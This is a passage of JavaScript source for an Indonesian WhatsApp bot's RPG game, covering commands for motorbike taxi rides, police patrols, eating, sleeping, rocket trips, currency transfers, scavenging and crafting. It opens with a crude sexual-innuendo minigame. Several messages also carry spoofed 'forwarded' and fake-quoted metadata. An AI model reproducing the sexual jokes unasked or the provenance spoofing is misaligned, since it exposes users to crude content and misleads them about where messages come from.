          'ajul gedang', 'gaya marmot', 'gaya roket', 'gaya kucing', 'gaya katak'
        ];

        const pilihanPetarung1 = pukulan[Math.floor(Math.random() * pukulan.length)];
        const pilihanPetarung2 = pukulan[Math.floor(Math.random() * pukulan.length)];

        const damagePetarung1 = Math.floor(Math.random() * 50) + 1;
        const damagePetarung2 = Math.floor(Math.random() * 50) + 1;

        result += `💦 Ronde ${ronde}\n`;
        result += `${db.users[m.sender].nama} stamina: ${nyawaPetarung1}\n`;
        result += `${args[0]} stamina: ${nyawaPetarung2}\n`;
        result += `${db.users[m.sender].nama}: ${pilihanPetarung1}\n`;
        result += `${args[0]}: ${pilihanPetarung2}\n\n`;

        if (pilihanPetarung1 === pilihanPetarung2) {
          result += `⚔️ Wikwik sedang berlangsung melakukan gaya yang sama! blom ada yang keluar sama sekali.\n`;
        } else {
          result += `💦 ${db.users[m.sender].nama} melakukan ${pilihanPetarung1} dan ${args[0]} melakukan ${pilihanPetarung2}!\n`;
          nyawaPetarung1 -= pilihanPetarung2 === 'jab' ? damagePetarung1 : damagePetarung1 + 10;
          nyawaPetarung2 -= pilihanPetarung1 === 'jab' ? damagePetarung2 : damagePetarung2 + 10;
          result += `💔 ${db.users[m.sender].nama} menerima jilmek ${nyawaPetarung1 >= 0 ? damagePetarung1 : 0}!\n`;
          result += `💔 ${args[0]} menerima spong ${nyawaPetarung2 >= 0 ? damagePetarung2 : 0}!\n\n--------------------------------------------------\n`;
        }

        ronde++;
      }

      result += `\n⏱️ Wikwik akhirnya berakhir!\n`;
      result += `${db.users[m.sender].nama} stamina akhir: ${nyawaPetarung1}\n`;
      result += `${args[0]} stamina akhir: ${nyawaPetarung2}\n`;

      if (nyawaPetarung1 > nyawaPetarung2) {
        result += `👙 ${db.users[m.sender].nama} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`;
      } else if (nyawaPetarung2 > nyawaPetarung1) {
        result += `🩲 ${args[0]} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`;
      } else {
        result += `👙💦 Pertandingan berakhir imbang! Kedua yang wikwik memiliki stamina yang sama.\n`;
      }
      global.db.erpg[m.sender].stamina -= 50
      await sock.sendTextWithMentions(m.chat, result, m)
    }
    break

    case 'ngojek':
    case 'ojek': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (!text) return m.reply(`Contoh: ${cmd} lampung|Jakarta\n\n*PENJELASAN*\n${cmd} [dari]|[tujuan] / Lampung ke Jakarta`)
      if (global.db.erpg[m.sender].stamina < 1) return m.reply(`Kamu Lemah, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nKetik _.heal_`)
      const arg1 = args.join(" ")
      const arg2 = arg1.split("|")[0];
      const arg3 = arg1.split("|")[1];
      if (!arg2) return !0
      if (!arg3) return !0
      let hah = ["Udin", "Yono", "Agus", "Asep", "Yanto", "Ahmad", "Riski", "Ridho", "Egy", "Pegi", "Rehan", "Yanti", "Putri", "Rahma", "Ica", "Caca", "Ayu", "Rini", "Lani", "Cika", "Nisa", "Alya", "Fikri", "Edo", "Angga", "Putra", "Yahya", "Fahri", "Fadil", "Aldo", "Resky", "Bela", "Kiki", "Zaki", "Reza", "Kak gem", "Uni bakwan"]
      let orgnya = hah[Math.floor(Math.random() * hah.length)]
      let tk1 = `${arg3}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
⬛⬜👤⬜⬜⬜⬜⬜⬅️🏍️⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${arg2}

*INFORMASI*
Lokasi awal: ${arg2}
Lokasi tujuan: ${arg3}

${orgnya}: 👤 (penumpang)
Ojek: 🏍️ ${db.users[m.sender].nama}
Status: Ojek sedang diperjalanan`
      let tk2 = `${arg3}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
⬛⬜⬜⬜⬜🏍️➡️⬜⬜⬜⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${arg2}

*INFORMASI*
Lokasi awal: ${arg2}
Lokasi tujuan: ${arg3}

${orgnya}: 👤 (penumpang)
Ojek: 🏍️ ${db.users[m.sender].nama}
Status: Mau ke lokasi tujuan (${randomNomor(17, 22)}%)`
      let tk3 = `${arg3}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬆️⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🏍️⬜⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${arg2}

*INFORMASI*
Lokasi awal: ${arg2}
Lokasi tujuan: ${arg3}

${orgnya}: 👤 (penumpang)
Ojek: 🏍️ ${db.users[m.sender].nama}
Status: Mau ke lokasi tujuan (${randomNomor(50, 57)}%)`
      let tk4 = `${arg3}
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜👤🏍️⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️⬛⬜⬜⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬜⬜⬛
⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛
⬛🌳🏠⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
${arg2}

*INFORMASI*
Lokasi awal: ${arg2}
Lokasi tujuan: ${arg3}
Status: Sampai ke tujuan`
      let ong = randomNomor(500, 1000)
      let tk5 = `*BERHASIL NGOJEK*

Informasi penumpang
Nama: ${orgnya}
Ongkos: ${toRupiah(ong)}

Pendapatan Ngojek
Nama: ${db.users[m.sender].nama}
Money: ${toRupiah(ong)}`
      db.users[m.sender].saldo += ong
      edit5(tk1, tk2, tk3, tk4, tk5)
    }
    break

    case 'polisi': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (global.db.erpg[m.sender].stamina <= 70) return m.reply(`Stamina Kamu ${global.db.erpg[m.sender].stamina}, Minimal Stamina 70% !!`)

      let uang = await randomNomor(7000, 25000)
      let stamina = await randomNomor(69, 85)

      let polic1 = 'Berpatroli...'
      let polic2 = 'Kamu menemukan maling...'
      let polic3 = 'Mengejar Maling'
      let polic4 = 'Maling Tertangkap.'
      let polic5 = `Kamu membawa maling tersebut
ke kantor polisi, dan
kamu mendapatkan

uang : ${uang}

Stamina terpakai: ${stamina}`
      edit5(polic1, polic2, polic3, polic4, polic5)
      db.users[m.sender].saldo += uang
      global.db.erpg[m.sender].stamina -= stamina
    }
    break

    case 'makan': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)

      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastmakan)
      if (new Date() - global.db.erpg[m.sender].lastmakan < 14400000) return m.reply(`Kamu Baru Saja Makan, ${waktuu} Yang Lalu, Kamu dapat Makan Lagi Setelah 4 Jam Berikutnya.`)

      let drhstam = await randomNomor(65, 95)
      m.reply(`Kamu makan sampai kenyang
Darah dan stamina kamu bertambah
sebanyak ${drhstam}%`)
      global.db.erpg[m.sender].darahuser += drhstam
      global.db.erpg[m.sender].stamina += drhstam
      global.db.erpg[m.sender].lastmakan = new Date * 1
    }
    break

    case 'turu':
    case 'sleep':
    case 'tidur': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)

      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lasttidur)
      if (new Date() - global.db.erpg[m.sender].lasttidur < 14400000) return m.reply(`Kamu Baru Saja Tidur, ${waktuu} Yang Lalu, Kamu dapat Tidur Lagi Nanti.`)

      let drhstam = await randomNomor(70, 100)
      let tidur = await randomNomor(3, 14)
      m.reply(`Kamu tidur selama ${tidur} jam
Darah dan stamina kamu bertambah
sebanyak ${drhstam}%`)
      global.db.erpg[m.sender].darahuser += drhstam
      global.db.erpg[m.sender].stamina += drhstam
      global.db.erpg[m.sender].lasttidur = new Date * 1
    }
    break

    case 'ngeroket':
    case 'roket': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].lastrocket)
      if (new Date() - global.db.erpg[m.sender].lastrocket < 259200000) return m.reply(`Kamu Baru Saja Ke bulan, ${waktuu} Yang Lalu, Kamu dapat pergi Lagi Nanti.`)

      if (global.db.erpg[m.sender].darahuser < 1) return m.reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')

      if (global.db.erpg[m.sender].darahuser <= 70) return m.reply(`Health Kamu ${global.db.erpg[m.sender].darahuser}%, Minimal health 70% !!`)
      if (global.db.erpg[m.sender].stamina <= 70) return m.reply(`Stamina Kamu ${global.db.erpg[m.sender].stamina}, Minimal Stamina 70% !!`)

      let saldo = await randomNomor(15000, 70000)
      let usrexp = await randomNomor(100, 500)
      let rokit = `🌕


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████
🚀

👨‍🚀 Memulai penerbangan....`
      let rokit2 = `🌕


🚀
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Dalam penerbangan....`
      let rokit3 = `🌕🚀


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
░█▀█▀█░█▀██░█▀█░█▄█▄█░
░█▀█▀█░█▀████▀█░█▄█▄█░
████████▀█████████████

➕ Sampai di tujuan....`
      let rokit4 = `🌕🚀

➕ Sukses Mendarat.... 👨‍🚀`

      let hsl = `
*—[ Hasil Ngroket ${db.users[m.sender].nama} ]—*
➕ 💹 Uang = [ ${saldo} ]
➕ ✨ Exp = [ ${usrexp} ]
➕ 🎁 Mendarat Selesai = +1`
      db.users[m.sender].saldo += saldo
      db.users[m.sender].exp += usrexp
      global.db.erpg[m.sender].darahuser -= 70
      global.db.erpg[m.sender].stamina -= 70
      global.db.erpg[m.sender].lastrocket = new Date * 1
      edit5(rokit, rokit2, rokit3, rokit4, hsl)
    }
    break

    case 'tfitem':
case 'tf':
case 'transfer': {

if (isPremium) return m.reply(`User Premium Tidak Dapat Mentransfer.`);
    
    try {
        if (!text) return m.reply(`Format: ${cmd}transfer [saldo/limit/glimit] [@tag/nomor] [jumlah]\nContoh: ${cmd}transfer limit @628123456789 1000`);
        
        const args = text.split(' ');
        if (args.length < 3) return m.reply(`Format salah!\nGunakan: ${cmd}transfer [jenis] [target] [jumlah]`);
        
        const tfType = args[0].toLowerCase();
        const target = args[1];
        const nominal = args[2];
        
        if (!target) return m.reply(`Tag/Masukkan Nomor Target\nContoh: ${cmd}${args[0]} @tag/628123456789 1000`);
        
        if (isNaN(nominal)) return m.reply('Nominal harus berupa angka!');
        const amount = parseInt(nominal);
        if (amount <= 0) return m.reply('Jumlah transfer harus lebih dari 0!');
        
        const maxTransfer = 1000000;
        if (amount > maxTransfer) return m.reply(`Maksimal transfer adalah Rp. ${toRupiah(maxTransfer)}`);
        
        const receiver = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        if (!db.users[receiver]) return m.reply('Penerima tidak terdaftar!');
        
        if (!db.users[m.sender]) db.users[m.sender] = {};
        if (!db.users[receiver]) db.users[receiver] = {};
        
        switch (tfType) {
            case 'saldo': {

        if (typeof db.users[m.sender].saldo === 'undefined') db.users[m.sender].saldo = 0;
                if (typeof db.users[receiver].saldo === 'undefined') db.users[receiver].saldo = 0;
                
                const senderBalance = db.users[m.sender].saldo;
                if (senderBalance < amount) return m.reply(`Saldo tidak cukup! Saldo Anda: Rp. ${toRupiah(senderBalance)}`);
                
                db.users[m.sender].saldo -= amount;
                db.users[receiver].saldo += amount;
                
                return sock.sendTextWithMentions(m.chat, 
                    `✅ *TRANSFER SALDO BERHASIL*\n\n` +
                    `• Pengirim: @${m.sender.split('@')[0]}\n` +
                    `• Penerima: @${receiver.split('@')[0]}\n` +
                    `• Jumlah: Rp. ${toRupiah(amount)}\n` +
                    `• Saldo Anda: Rp. ${toRupiah(db.users[m.sender].saldo)}`, 
                    m
                );
            }
            
            case 'limit': {

        if (typeof db.users[m.sender].limit === 'undefined') db.users[m.sender].limit = 0;
                if (typeof db.users[receiver].limit === 'undefined') db.users[receiver].limit = 0;
                
                const senderLimit = db.users[m.sender].limit;
                if (senderLimit < amount) return m.reply(`Limit tidak cukup! Limit Anda: ${senderLimit}`);
                
                db.users[m.sender].limit -= amount;
                db.users[receiver].limit += amount;
                
                return sock.sendTextWithMentions(m.chat, 
                    `✅ *TRANSFER LIMIT BERHASIL*\n\n` +
                    `• Pengirim: @${m.sender.split('@')[0]}\n` +
                    `• Penerima: @${receiver.split('@')[0]}\n` +
                    `• Jumlah: ${amount} limit\n` +
                    `• Limit Anda: ${db.users[m.sender].limit}`, 
                    m
                );
            }
            
            case 'limitgame':
            case 'gamelimit':
            case 'glimit': {

        if (typeof db.users[m.sender].glimit === 'undefined') db.users[m.sender].glimit = 0;
                if (typeof db.users[receiver].glimit === 'undefined') db.users[receiver].glimit = 0;
                
                const senderGLimit = db.users[m.sender].glimit;
                if (senderGLimit < amount) return m.reply(`Game limit tidak cukup! Limit Anda: ${senderGLimit}`);
                
                db.users[m.sender].glimit -= amount;
                db.users[receiver].glimit += amount;
                
                return sock.sendTextWithMentions(m.chat, 
                    `✅ *TRANSFER GAME LIMIT BERHASIL*\n\n` +
                    `• Pengirim: @${m.sender.split('@')[0]}\n` +
                    `• Penerima: @${receiver.split('@')[0]}\n` +
                    `• Jumlah: ${amount} game limit\n` +
                    `• Game Limit Anda: ${db.users[m.sender].glimit}`, 
                    m
                );
            }
            
            default:
                return m.reply(`*Jenis Transfer Tidak Valid*\n\n` +
                    `Tersedia:\n` +
                    `• saldo\n` +
                    `• limit\n` +
                    `• glimit\n\n` +
                    `Contoh: ${cmd} limit @tag 1000`);
        }
    } catch (err) {
        console.error('Transfer Error:', err);
        return m.reply('Terjadi kesalahan saat memproses transfer!');
    }
}
break

    case 'nyampah': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)

      let botol = await randomNomor(15, 46)
      let bulu = await randomNomor(5, 36)
      let kain = await randomNomor(3, 14)
      let kardus = await randomNomor(5, 30)
      let kaleng = await randomNomor(9, 37)
      let plastik = await randomNomor(20, 56)
      let gelas = await randomNomor(5, 19)
      let health = await randomNomor(15, 40)

      let waktuu = await clockString(new Date() - global.db.erpg[m.sender].sampahtime)
      if (new Date() - global.db.erpg[m.sender].sampahtime < 18000000) return m.reply(`Kamu Baru Saja Nyampah ${waktuu} Yang Lalu, Silahkan Tunggu 5 Jam Setelah Terakhir Kali Nyampah`)

      global.db.erpg[m.sender].bulu += bulu
      global.db.erpg[m.sender].kain += kain
      global.db.erpg[m.sender].botol += botol
      global.db.erpg[m.sender].kardus += kardus
      global.db.erpg[m.sender].kaleng += kaleng
      global.db.erpg[m.sender].gelas += gelas
      global.db.erpg[m.sender].plastik += plastik
      global.db.erpg[m.sender].darahuser -= health
      global.db.erpg[m.sender].sampahtime = new Date * 1

      m.reply(`*–––––– NYAMPAH ––––––*

Items Didapat
  ${vircion} • Botol: ${botol}
  ${vircion} • Kain: ${kain}
  ${vircion} • Bulu: ${bulu}
  ${vircion} • Kardus: ${kardus}
  ${vircion} • Kaleng: ${kaleng}
  ${vircion} • Gelas: ${gelas}
  ${vircion} • Plastik: ${plastik}
  
Stamina Berkurang -${health}`)
    }
    break

    case 'skillselect':
    case 'selectskill': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      const user = global.db.erpg[m.sender].skillselect
      const skill = ["swordmaster", "necromancer", "witch", "Archer", "magicswordmaster", "thief", "shadow"]
      const skil = text.trim().toLowerCase()
      if (!skill.includes(skil)) return m.reply(`Select skill yang ingin kamu gunakan. 

${skill.map(skil => `› ${skil}`).join('\n')}.

Example: ${command} necromancer

*Note!! :* 
Kamu hanya bisa memilih skill 1x selebihnya 
tidak akan bisa memilih/ganti lagi`)
      if (!user || !user.skill) {
        global.db.erpg[m.sender].skillselect = skil
        m.reply(`Anda telah memilih Skill ${skil}`)
      } else {
        m.reply(`Anda Sudah Punya skill ${user.skill}. Tidak bisa diganti`)
      }
    }
    break

    case 'crafting':
    case 'craft': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (text.includes('-')) return m.reply('Nominal Tidak valid!!');
      if (args[0] === "kain") {
        if (!args[1]) return m.reply(`*Masukan Jumlahnya!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
        let bulu = Number(parseInt(args[1]) * 2)
        if (global.db.erpg[m.sender].bulu < bulu) return m.reply(`*Bulu Wol Kamu (${global.db.erpg[m.sender].bulu}) Tidak Cukup Untuk Membuat ${args[1]} Lembar Kain*\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
        global.db.erpg[m.sender].kain += parseInt(args[1])
        global.db.erpg[m.sender].bulu -= bulu
        m.reply(`Berhasil Membuat ${args[1]} Lembar Kain, Kamu Mempunyai ${global.db.erpg[m.sender].bulu} Bulu Lagi`)
      } else if (args[0] === "kapal") {
        if (global.db.erpg[m.sender].kapal) return m.reply('Kamu Sudah Memiliki Kapal!')
        let besi = Number(20)
        let kayu = Number(50)
        let kain = Number(2)
        if (global.db.erpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kain < kain) return m.reply(`*Kain Kamu (${global.db.erpg[m.sender].kain}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
        global.db.erpg[m.sender].kapal = true
        global.db.erpg[m.sender].besi -= besi
        global.db.erpg[m.sender].kayu -= kayu
        global.db.erpg[m.sender].kain -= kain
        let kapal = `*Berhasil Membuat Kapal!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kain: ${global.db.erpg[m.sender].kain}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n\n`
        await sock.sendMessage(m.chat, {
          text: kapal,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG-GAME (Pirate Ship)",
              body: 'Build a pirate ship',
              thumbnailUrl: "https://telegra.ph/file/6868733df8aa286682274.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      } else if (args[0] === "kapak") {
        if (global.db.erpg[m.sender].kapak) return m.reply('Kamu Sudah Memiliki Kapak!')
        let besi = Number(2)
        let kayu = Number(1)
        if (global.db.erpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].kapak = true
        global.db.erpg[m.sender].besi -= besi
        global.db.erpg[m.sender].kayu -= kayu
        let kapak = `*Berhasil Membuat Kapak!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n\n`
        await sock.sendMessage(m.chat, {
          text: kapak,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG-GAME (Tools Crafting)",
              body: 'Making equipment',
              thumbnailUrl: "https://telegra.ph/file/454b6bac735cd5c9e860e.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      } else if (args[0] === "rumah") {
        if (!(`${global.db.erpg[m.sender].wilayahrumah}` === `${global.db.erpg[m.sender].wilayah}`)) return m.reply(`Kamu Saat Ini Sedang Di ${global.db.erpg[m.sender].wilayah}, Kamu Hanya Dapat Membangun Rumah Di Indonesia, Silahkan Kembali Berlayar Ke Indonesia Untuk Membangun Rumah`)
        if (!args[1]) return m.reply('*Masukan Jumlahnya!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
        if (isNaN(args[1])) return m.reply('*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
        let besi = Number(parseInt(args[1]) * 6)
        let kayu = Number(parseInt(args[1]) * 20)
        if (global.db.erpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].rumah += parseInt(args[1])
        global.db.erpg[m.sender].besi -= besi
        global.db.erpg[m.sender].kayu -= kayu
        let rumah = `*Berhasil Membuat ${args[1]} Rumah!*\n\nJumlah: ${args[1]} Rumah\nLetak: Indonesia\n\n`
        await sock.sendMessage(m.chat, {
          text: rumah,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG-GAME (House Crafting)",
              body: 'Build a house to rest',
              thumbnailUrl: "https://telegra.ph/file/748043e987c3b38708d44.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      } else if (args[0] === "pickaxe") {
        if (global.db.erpg[m.sender].pickaxe) return m.reply('Kamu Sudah Memiliki Pickaxe!')
        let besi = Number(2)
        let kayu = Number(1)
        if (global.db.erpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Pickaxe*\n\nUntuk Membuat Pickaxe Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
        global.db.erpg[m.sender].pickaxe = true
        global.db.erpg[m.sender].besi -= besi
        global.db.erpg[m.sender].kayu -= kayu
        let pickaxe = `*Berhasil Membuat Pickaxe!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n\n`
        await sock.sendMessage(m.chat, {
          text: pickaxe,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "RPG-GAME (Tools Crafting)",
              body: 'Making equipment',
              thumbnailUrl: "https://telegra.ph/file/9bd57cb7d6e04a4a51d7c.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      } else if (args[0] === "bajuzirah") {
        if (global.db.erpg[m.sender].bzirah) return m.reply('Kamu Sudah Memiliki Baju Zirah!')
        let besi = Number(6)
        let kayu = Number(2)
        let kain = Number(10)
        if (global.db.erpg[m.sender].besi < besi) return m.reply(`*Besi Kamu (${global.db.erpg[m.sender].besi}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kayu < kayu) return m.reply(`*Kayu Kamu (${global.db.erpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
        if (global.db.erpg[m.sender].kain < kain) return m.reply(`*Kain Kamu (${global.db.erpg[m.sender].kain}) Tidak Cukup Untuk Membuat Baju Zirah*\n\nUntuk Membuat Baju Zirah Diperlukan *6 Besi, 2 Kayu, 10 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
        global.db.erpg[m.sender].bzirah = true
        global.db.erpg[m.sender].besi -= besi
        global.db.erpg[m.sender].kayu -= kayu
        global.db.erpg[m.sender].kain -= kain
        let bajuzirah = `*Berhasil Membuat Baju Zirah!*\n\nSisa Sumberdaya:\n- Besi: ${global.db.erpg[m.sender].besi}\n- Kayu: ${global.db.erpg[m.sender].kayu}\n- Kain: ${global.db.erpg[m.sender].kain}\n\n`
        await sock.sendMessage(m.chat, {
          text: bajuzirah,
          contextInfo: {
